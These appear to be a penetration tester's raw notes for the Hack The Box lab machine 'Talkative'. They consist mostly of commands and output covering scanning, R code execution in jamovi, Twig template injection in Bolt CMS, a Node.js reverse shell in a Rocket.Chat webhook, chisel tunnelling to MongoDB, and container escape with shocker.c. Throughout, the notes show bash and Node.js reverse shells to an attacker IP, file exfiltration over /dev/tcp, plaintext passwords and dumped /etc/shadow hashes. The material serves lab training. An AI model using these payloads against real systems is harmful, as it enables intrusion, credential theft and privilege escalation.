@@ -1,0 +1,763 @@
+./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:27017:172.17.0.2:27017
+./chisel_1.7.7_linux_amd64 client 10.10.16.19:8000 R:27017:172.17.0.2:27017
+
+./chisel_1.7.7_linux_amd64 client 10.10.16.19:8000 127.0.0.1:27017:172.17.0.2:27017
+
+const require = console.log.constructor('return process.mainModule.require')();
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8181, "10.10.16.19", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+let's enumerate 
+command: sudo rustscan -a 10.10.11.155
+result:
+PORT     STATE SERVICE         REASON
+80/tcp   open  http            syn-ack ttl 62
+8080/tcp open  http-proxy      syn-ack ttl 62
+8081/tcp open  blackice-icecap syn-ack ttl 62
+8082/tcp open  blackice-alerts syn-ack ttl 62
+
+command: sudo nmap -sSVC -A -p 80,8080,8081,8082 10.10.11.155
+result:
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.52
+|_http-title: Talkative.htb | Talkative
+|_http-generator: Bolt
+|_http-server-header: Apache/2.4.52 (Debian)
+8080/tcp open  http    Tornado httpd 5.0
+|_http-title: jamovi
+|_http-server-header: TornadoServer/5.0
+8081/tcp open  http    Tornado httpd 5.0
+|_http-title: 404: Not Found
+|_http-server-header: TornadoServer/5.0
+8082/tcp open  http    Tornado httpd 5.0
+|_http-title: 404: Not Found
+|_http-server-header: TornadoServer/5.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: phone|general purpose|proxy server|webcam|VoIP phone
+Running (JUST GUESSING): Google Android 4.4.X (92%), Linux 4.X|5.X|2.6.X|3.X (91%), WebSense embedded (90%), AXIS embedded (89%), Cisco embedded (89%)
+OS CPE: cpe:/o:google:android:4.4.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/h:cisco:cp-dx80 cpe:/o:google:android
+Aggressive OS guesses: Android 4.4.0 (92%), Linux 4.15 - 5.6 (91%), Websense Content Gateway (90%), Linux 2.6.32 (90%), Linux 5.0 - 5.3 (90%), Linux 3.6 - 3.10 (90%), Linux 5.3 - 5.4 (90%), Axis M3006-V network camera (89%), Cisco CP-DX80 collaboration endpoint (Android) (89%), Android 4.0.4 (Linux 2.6) (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: 172.17.0.7
+
+add this 10.10.11.155 talkative.htb to /etc/hosts
+access: http://talkative.htb/
+
+command: wfuzz -u http://talkative.htb -H "Host: FUZZ.talkative.htb" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-5000.txt --hw 28
+result:
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://talkative.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                          
+=====================================================================
+
+access: http://talkative.htb/person/janit-smith
+email: janit@talkative.htb
+
+access: http://talkative.htb/person/saul-goodman
+email: saul@talkative.htb
+
+access: http://talkative.htb/person/matt-williams
+email: matt@talkative.htb
+
+technology from burpsuite:
+HTTP/1.1 200 OK
+Date: Mon, 03 Jul 2023 19:36:19 GMT
+Server: Apache/2.4.52 (Debian)
+X-Powered-By: PHP/7.4.28
+Cache-Control: max-age=0, must-revalidate, private
+permissions-policy: interest-cohort=()
+X-Powered-By: Bolt
+Link: <http://talkative.htb/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"
+Expires: Mon, 03 Jul 2023 19:36:20 GMT
+Vary: Accept-Encoding
+Content-Length: 36943
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+command: ./feroxbuster -u http://talkative.htb -x php -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+very slow result:
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET      365l     1247w    19714c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      110l      266w     2931c http://talkative.htb/theme/base-2021/js/app.js
+200      GET      364l      741w     6647c http://talkative.htb/theme/base-2021/css/base-2021.css
+404      GET        0l        0w        0c http://talkative.htb/images
+301      GET       12l       22w      354c http://talkative.htb/person/ => http://talkative.htb/person
+301      GET       12l       22w      346c http://talkative.htb/page/ => http://talkative.htb/page
+301      GET        9l       28w      314c http://talkative.htb/files => http://talkative.htb/files/
+301      GET       12l       22w      358c http://talkative.htb/product/ => http://talkative.htb/product
+301      GET       12l       22w      342c http://talkative.htb/en => http://talkative.htb/en/
+200      GET   105586l   195168w  2419899c http://talkative.htb/theme/base-2021/css/tailwind.css
+301      GET        9l       28w      315c http://talkative.htb/assets => http://talkative.htb/assets/
+200      GET      258l     1002w    15838c http://talkative.htb/search
+301      GET       12l       22w      342c http://talkative.htb/fr => http://talkative.htb/fr/
+[>-------------------] - 64s     1231/150028  2h      found:12      errors:1160   
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_talkative_htb-1688413099.state ...
+[>-------------------] - 64s     1244/150028  2h      found:12      errors:1174   
+[>-------------------] - 64s      415/30000   6/s     http://talkative.htb/ 
+[>-------------------] - 49s      194/30000   4/s     http://talkative.htb/files/ 
+[>-------------------] - 49s      194/30000   4/s     http://talkative.htb/en/ 
+[>-------------------] - 49s      199/30000   4/s     http://talkative.htb/assets/ 
+[>-------------------] - 35s       95/30000   3/s     http://talkative.htb/fr/ 
+[--------------------] - 0s         0/30000   -       http://talkative.htb/theme/base-2021/js/app.js 
+[--------------------] - 0s         0/30000   -       http://talkative.htb/theme/base-2021/css/base-2021.css 
+[--------------------] - 0s         0/30000   -       http://talkative.htb/person/ 
+[--------------------] - 0s         0/30000   -       http://talkative.htb/page/ 
+[--------------------] - 0s         0/30000   -       http://talkative.htb/product/ 
+[--------------------] - 0s         0/30000   -       http://talkative.htb/theme/base-2021/css/tailwind.css 
+
+access port 3000: http://talkative.htb:3000/
+result: rocker chat
+register and login.
+access: http://talkative.htb:3000/home
+access: http://talkative.htb:3000/channel/general
+
+access: http://talkative.htb:8080/?id=438cc53f-eaa9-412d-94b1-a049826fca0c
+version: 0.9.5.5
+
+access: http://talkative.htb:8081/
+404: Not Found
+
+access: http://talkative.htb:8082/
+404: Not Found
+
+access: http://talkative.htb:8080/?id=01598b0d-4b63-4408-a1a2-3f80a775b5b8
+r -> rj editor.
+code: system("id", intern = TRUE)
+ctrl + shift + enter
+
+command: nc -lvnp 7979
+code: system("bash -c 'bash -i >& /dev/tcp/10.10.16.19/7979 0>&1'", intern = TRUE)
+ctrl + shift + enter
+
+let's upgrade shell.
+command: script /dev/null -c bash
+
+command: hostname
+b06821bbda78
+
+command: cat /proc/net/fib_trie
+Main:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.18.0.0/16 2 0 2
+        +-- 172.18.0.0/30 2 0 2
+           |-- 172.18.0.0
+              /32 link BROADCAST
+              /16 link UNICAST
+           |-- 172.18.0.2
+              /32 host LOCAL
+        |-- 172.18.255.255
+           /32 link BROADCAST
+Local:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.18.0.0/16 2 0 2
+        +-- 172.18.0.0/30 2 0 2
+           |-- 172.18.0.0
+              /32 link BROADCAST
+              /16 link UNICAST
+           |-- 172.18.0.2
+              /32 host LOCAL
+        |-- 172.18.255.255
+           /32 link BROADCAST
+
+command: ps auxww
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0 101704   284 ?        Ss   19:28   0:00 /bin/bash /usr/bin/jamovi-server 41337 --if=*
+root          12  0.2  1.1 838964 23832 ?        Sl   19:28   0:03 python3 -u -m jamovi.server 41337 --if=*
+root          43  1.3  3.7 431584 74420 ?        Sl   19:50   0:01 /usr/lib/jamovi/bin/jamovi-engine --con=ipc:///tmp/tmpyfurny7z/conn-0 --path=/tmp/tmpl2gjih5w
+root          46  0.7  2.9 255852 59832 ?        Sl   19:50   0:00 /usr/lib/jamovi/bin/jamovi-engine --con=ipc:///tmp/tmpyfurny7z/conn-1 --path=/tmp/tmpl2gjih5w
+root          48  0.7  2.9 255852 59620 ?        Sl   19:50   0:00 /usr/lib/jamovi/bin/jamovi-engine --con=ipc:///tmp/tmpyfurny7z/conn-2 --path=/tmp/tmpl2gjih5w
+root          56  0.0  0.2  90072  5784 ?        S    19:50   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.10.16.19/7979 0>&1'
+root          57  0.0  0.3 101704  7240 ?        S    19:50   0:00 bash -c bash -i >& /dev/tcp/10.10.16.19/7979 0>&1
+root          58  0.0  0.3 101880  7712 ?        S    19:50   0:00 bash -i
+root          65  0.0  0.3 102660  6376 ?        R    19:51   0:00 script /dev/null -c bash
+root          66  0.0  0.2  90072  5748 pts/0    Ss   19:51   0:00 sh -c bash
+root          67  0.0  0.3 101904  7632 pts/0    S    19:51   0:00 bash
+root          80  0.0  0.3 115908  7156 pts/0    R+   19:52   0:00 ps auxww
+
+command: cd /root
+command: ls -al
+total 28
+drwx------ 1 root root 4096 Mar  7  2022 .
+drwxr-xr-x 1 root root 4096 Mar  7  2022 ..
+lrwxrwxrwx 1 root root    9 Mar  7  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x 3 root root 4096 Jul  3 19:50 .jamovi
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxrwxrwx 2 root root 4096 Aug 15  2021 Documents
+-rw-r--r-- 1 root root 2192 Aug 15  2021 bolt-administration.omv
+
+download bolt-administration.omv file.
+target> cat bolt-administration.omv > /dev/tcp/10.10.16.19/445
+host> sudo nc -lvnp 445 > bolt-administration.omv
+
+command: md5sum bolt-administration.omv 
+89a471297760280c51d7a48246f95628  bolt-administration.omv
+
+command: file bolt-administration.omv 
+bolt-administration.omv: Java archive data (JAR)
+
+command: unzip -l bolt-administration.omv 
+Archive:  bolt-administration.omv
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+      106  2021-08-14 23:16   META-INF/MANIFEST.MF
+      106  2021-08-14 23:16   meta
+     2505  2021-08-14 23:16   index.html
+     1055  2021-08-14 23:16   metadata.json
+      433  2021-08-14 23:16   xdata.json
+       48  2021-08-14 23:16   data.bin
+       50  2021-08-14 23:16   01 empty/analysis
+---------                     -------
+     4303                     7 files
+
+command: unzip bolt-administration.omv 
+command:  cat xdata.json | jq .
+result:
+{
+  "A": {
+    "labels": [
+      [
+        0,
+        "Username",
+        "Username",
+        false
+      ],
+      [
+        1,
+        "matt@talkative.htb",
+        "matt@talkative.htb",
+        false
+      ],
+      [
+        2,
+        "janit@talkative.htb",
+        "janit@talkative.htb",
+        false
+      ],
+      [
+        3,
+        "saul@talkative.htb",
+        "saul@talkative.htb",
+        false
+      ]
+    ]
+  },
+  "B": {
+    "labels": [
+      [
+        0,
+        "Password",
+        "Password",
+        false
+      ],
+      [
+        1,
+        "jeO09ufhWD<s",
+        "jeO09ufhWD<s",
+        false
+      ],
+      [
+        2,
+        "bZ89h}V<S_DA",
+        "bZ89h}V<S_DA",
+        false
+      ],
+      [
+        3,
+        ")SQWGm>9KHEA",
+        ")SQWGm>9KHEA",
+        false
+      ]
+    ]
+  },
+  "C": {
+    "labels": []
+  }
+}
+
+access: http://talkative.htb:3000/admin
+access: http://talkative.htb/bolt/login
+username: admin@talkative.htb
+password: jeO09ufhWD<s
+
+access: http://talkative.htb/bolt/clearcache
+access: http://talkative.htb/bolt/file-edit/config?file=/bolt/config.yaml
+access: http://talkative.htb/bolt/file-edit/themes?file=/base-2021/index.twig
+
+add this code:
+{% block main %}
+{{['id']|filter('sytem')}}
+
+access: http://talkative.htb/
+result:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Array
+
+access: http://talkative.htb/bolt/file-edit/themes?file=/base-2021/index.twig
+add this code to template:
+{% block main %}
+
+{{['bash -c "bash -i >& /dev/tcp/10.10.16.19/4444 0>&1"']|filter('system')}}
+
+  {% include 'partials/_index_hero.twig' with { content: 'blocks/hero-section' } %}
+
+clear cache: 
+http://talkative.htb/bolt/clearcache
+command: nc -lvnp 4444
+access: http://talkative.htb/
+
+command: cd /
+command: ls -al /.dockerenv 
+-rwxr-xr-x 1 root root 0 Jul  3 19:28 /.dockerenv
+
+command: hostname
+07ae36c3df10
+
+command: cat /proc/net/fib_trie
+Main:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.17.0.0/16 2 0 2
+        +-- 172.17.0.0/29 2 0 2
+           |-- 172.17.0.0
+              /32 link BROADCAST
+              /16 link UNICAST
+           |-- 172.17.0.7
+              /32 host LOCAL
+        |-- 172.17.255.255
+           /32 link BROADCAST
+Local:
+  +-- 0.0.0.0/0 3 0 5
+     |-- 0.0.0.0
+        /0 universe UNICAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+     +-- 172.17.0.0/16 2 0 2
+        +-- 172.17.0.0/29 2 0 2
+           |-- 172.17.0.0
+              /32 link BROADCAST
+              /16 link UNICAST
+           |-- 172.17.0.7
+              /32 host LOCAL
+        |-- 172.17.255.255
+           /32 link BROADCAST
+
+command: ssh saul@172.17.0.1
+password: jeO09ufhWD<s
+
+command: cat user.txt 
+3a9c8d16a17f849512b3829a267ee3a0
+
+command: root         930  0.1  1.0 1529512 21160 ?       Ssl  19:28   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root        1274  0.0  0.0 1222576 1156 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
+root        1280  0.0  0.0 1222576 1156 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8082 -container-ip 172.18.0.2 -container-port 41339
+root        1301  0.0  0.0 1222576  428 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
+root        1307  0.0  0.0 1075112  484 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8081 -container-ip 172.18.0.2 -container-port 41338
+root        1323  0.0  0.0 1148844 1332 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
+root        1328  0.0  0.0 1075112 1032 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 8080 -container-ip 172.18.0.2 -container-port 41337
+root        1450  0.0  0.0 1222576  512 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.3 -container-port 3000
+root        1536  0.0  0.0 1075368  496 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.4 -container-port 80
+root        1719  0.0  0.0 1075368  712 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.5 -container-port 80
+root        1838  0.0  0.0 1222576  488 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.6 -container-port 80
+root        1956  0.0  0.0 1222576  560 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.7 -container-port 80
+root        2075  0.0  0.0 1222576  368 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.8 -container-port 80
+root        2189  0.0  0.0 1296564  392 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.9 -container-port 80
+root        2304  0.0  0.0 1148844  884 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.10 -container-port 80
+root        2414  0.0  0.0 1223984  492 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.11 -container-port 80
+root        2524  0.0  0.0 1149100  296 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.12 -container-port 80
+root        2634  0.0  0.0 1150252  600 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.13 -container-port 80
+root        2747  0.0  0.0 1150252  796 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.14 -container-port 80
+root        2856  0.0  0.0 1148844  652 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.15 -container-port 80
+root        2974  0.0  0.0 1075112  456 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.16 -container-port 80
+root        3084  0.0  0.0 1222576  428 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.17 -container-port 80
+root        3190  0.0  0.0 1148844  408 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.18 -container-port 80
+root        3308  0.0  0.0 1148844  668 ?        Sl   19:28   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.19 -container-port 80
+saul        4887  0.0  0.0   6432   720 pts/0    S+   20:13   0:00 grep --color=auto docker
+
+command: ping -c 1 172.17.0.2
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.114 ms
+
+--- 172.17.0.2 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.114/0.114/0.114/0.000 ms
+
+access: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
+upload nmap statically compiled to target machine.
+
+command: chmod +x nmap
+command: ./nmap 172.17.0.2 --min-rate 10000 -p-
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-07-03 20:18 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.17.0.2
+Host is up (0.000084s latency).
+Not shown: 65534 closed ports
+PORT      STATE SERVICE
+27017/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
+
+27017 is commonly used for MongoDB.
+
+get chisel from here: https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+upload to target machine.
+
+command: wget http://10.10.16.19:8181/chisel_1.7.7_linux_amd64
+host> ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
+target> ./chisel_1.7.7_linux_amd64 client 10.10.16.19:8000 R:27017:172.17.0.2:27017
+
+open mongodb compass.
+uri: mongodb://localhost:27017/?directConnection=true
+access: meteor -> users -> change our test@talkative.htb email role to admin
+access: http://talkative.htb:3000/admin
+access: http://talkative.htb:3000/admin/integrations
+
+RCE WebHook Integration
+access: http://talkative.htb:3000/admin/integrations/new
+access: http://talkative.htb:3000/admin/integrations/incoming
+enabled: True
+Name: test
+Post to channel: #general
+Post as: test
+Script Enabled: True
+
+access: https://www.revshells.com/
+choose node.js #2 shell /bin/sh
+(function(){
+    const require = console.log.constructor('return process.mainModule.require')();
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(445, "10.10.16.19", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+put above code to script.
+
+back choose integration and choose hook will show:
+http://talkative.htb:3000/hooks/HYyAqbszGTfMvtPvE/79PaWhdxRRJrNFvvGKZRaczb2mkA5HGaehnQZoKdguoZSC5C
+
+command: sudo nc -lvnp 445
+command: curl http://talkative.htb:3000/hooks/HYyAqbszGTfMvtPvE/79PaWhdxRRJrNFvvGKZRaczb2mkA5HGaehnQZoKdguoZSC5C
+result:
+{"success":false}                                                                                                                                                                                       
+
+upgrade shell 
+access: https://github.com/stealthcopter/deepce
+access: https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh
+upload deepce.sh 
+
+host> cat deepce.sh | nc -lvnp 8181
+tartget> exec 3<>/dev/tcp/10.10.16.19/8181
+target> cat <&3 > deepce.sh  
+
+command: bash deepce.sh
+result:
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+
+==========================================( Colors )==========================================
+[+] Exploit Test ............ Exploitable - Check this out
+[+] Basic Test .............. Positive Result
+[+] Another Test ............ Error running check
+[+] Negative Test ........... No
+[+] Multi line test ......... Yes
+Command output
+spanning multiple lines
+
+Tips will look like this and often contains links with additional info. You can usually 
+ctrl+click links in modern terminal to open in a browser window
+See https://stealthcopter.github.io/deepce
+
+===================================( Enumerating Platform )===================================
+[+] Inside Container ........ Yes
+[+] Container Platform ...... docker
+[+] Container tools ......... None
+[+] User .................... root
+[+] Groups .................. root
+[+] Docker Executable ....... Not Found
+[+] Docker Sock ............. Not Found
+[+] Docker Version .......... Version Unknown
+==================================( Enumerating Container )===================================
+[+] Container ID ............ c150397ccd63
+[+] Container Full ID ....... c150397ccd634de99b32847ec1df1342c8a8107f002bb12ec7460ae6aa93e726
+[+] Container Name .......... Could not get container name through reverse DNS
+[+] Container IP ............ 172.17.0.3 
+[+] DNS Server(s) ........... 1.1.1.1 
+[+] Host IP ................. 172.17.0.1
+[+] Operating System ........ GNU/Linux
+[+] Kernel .................. 5.4.0-81-generic
+[+] Arch .................... x86_64
+[+] CPU ..................... AMD EPYC 7302P 16-Core Processor
+[+] Useful tools installed .. Yes
+/bin/hostname
+[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
+libcap2-bin is required but not installed
+apt install -y libcap2-bin
+
+Current capabilities are:
+CapInh:	0000000000000000
+CapPrm:	00000000a80425fd
+CapEff:	00000000a80425fd
+CapBnd:	00000000a80425fd
+CapAmb:	0000000000000000
+> This can be decoded with: "capsh --decode=00000000a80425fd"
+[+] SSHD Service ............ Unknown (ps not installed)
+[+] Privileged Mode ......... No
+====================================( Enumerating Mounts )====================================
+[+] Docker sock mounted ....... No
+[+] Other mounts .............. No
+====================================( Interesting Files )=====================================
+[+] Interesting environment variables ... No
+[+] Any common entrypoint files ......... No
+[+] Interesting files in root ........... No
+[+] Passwords in common files ........... No
+[+] Home directories .................... No
+[+] Hashes in shadow file ............... No permissions
+[+] Searching for app dirs .............. 
+==================================( Enumerating Containers )==================================
+By default containers can communicate with other containers on the same network and the 
+host machine, this can be used to enumerate further
+
+Could not ping sweep, requires nmap or ping to be executable
+==============================================================================================
+
+take attention:
+[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
+
+command: cat /etc/os-release
+cat /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+access: https://manpages.debian.org/buster/libcap2-bin/capsh.1.en.html
+access: https://tracker.debian.org/pkg/libcap2
+
+host> wget http://http.us.debian.org/debian/pool/main/libc/libcap2/libcap2_2.25-2_amd64.deb
+host> wget http://http.us.debian.org/debian/pool/main/libc/libcap2/libcap2-bin_2.25-2_amd64.deb
+
+please upload:
+- libcap2_2.25-2_amd64.deb
+- libcap2-bin_2.25-2_amd64.deb
+to target machine.
+
+host> cat libcap2_2.25-2_amd64.deb | nc -lvnp 8181
+tartget> exec 3<>/dev/tcp/10.10.16.19/8181
+target> cat <&3 > libcap2_2.25-2_amd64.deb 
+
+host> cat libcap2-bin_2.25-2_amd64.deb | nc -lvnp 8181
+tartget> exec 3<>/dev/tcp/10.10.16.19/8181
+target> cat <&3 > libcap2-bin_2.25-2_amd64.deb 
+
+command: dpkg -i libcap2_2.25-2_amd64.deb  && dpkg -i libcap2-bin_2.25-2_amd64.deb 
+
+deepce.sh again.
+command: bash deepce.sh
+result:
+[+] Dangerous Capabilities .. Yes
+Current: = cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+
+This blog post from 2014 shows how to abuse this capability using a program posted to OpenWall 
+named shocker.c. 
+This program abuses the cap_dac_read_search capability to read files from the host system.
+
+get shocker.c from here:
+http://stealth.openwall.net/xSports/shocker.c
+
+target> mount
+result:
+/dev/mapper/ubuntu--vg-ubuntu--lv on /app/uploads type ext4 (rw,relatime)
+/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/resolv.conf type ext4 (rw,relatime)
+/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime)
+/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hosts type ext4 (rw,relatime)
+
+change shocker code here:
+if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
+		die("[-] open");
+
+compile gcc using ubuntu 18.04 this docker yaml:
+version: '3.8'
+services:
+  ubuntu:
+    image: ubuntu:18.04
+    container_name: ubuntu
+    network_mode: host
+    restart: unless-stopped
+    # volumes:
+    #   - /mnt:/NAS:rw
+    environment:
+      - TZ="Asia/Shanghai"
+    command: "tail -f /dev/null"
+volumes:
+  db:
+    driver: local
+
+command: docker cp ~/Documents/talkative/shocker.c c62a3db2e92c:/shocker.c
+Successfully copied 6.66kB to c62a3db2e92c:/shocker.c
+
+docker> apt update
+docker> apt install gcc
+docker> gcc shocker.c -o shocker
+
+host>docker cp c62a3db2e92c:/shocker ~/Documents/talkative/shocker
+Successfully copied 15.4kB to /home/donika-pentest/Documents/talkative/shocker
+
+host> cat shocker | nc -lvnp 8181
+tartget> exec 3<>/dev/tcp/10.10.16.19/8181
+target> cat <&3 > shocker 
+
+command: ./shocker
+<enter>
+result:
+root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
+saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
+
+change shocker code to this:
+if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
+		die("[-] open");
+if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
+    die("[-] Cannot find valid handle!");
+
+then repeat compile on local docker upload to target machine.
+
+command: [!] Win! /etc/shadow output follows:
+root.txt:
+adb2e76a86338416591784a7f711454b
+
+get shocker writer in here: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override
+command: docker cp ~/Documents/talkative/shocker_write.c c62a3db2e92c:/ 
+compile on docker
+
+host> cat shocker_write | nc -lvnp 8181
+tartget> exec 3<>/dev/tcp/10.10.16.19/8181
+target> cat <&3 > shocker_write 
+
+target> echo a > a
+target> ./shocker_write /etc/hostname a
+saul> cat /etc/hostname
+a
+lkative
+
+create passwd.
+command: cat passwd                       
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
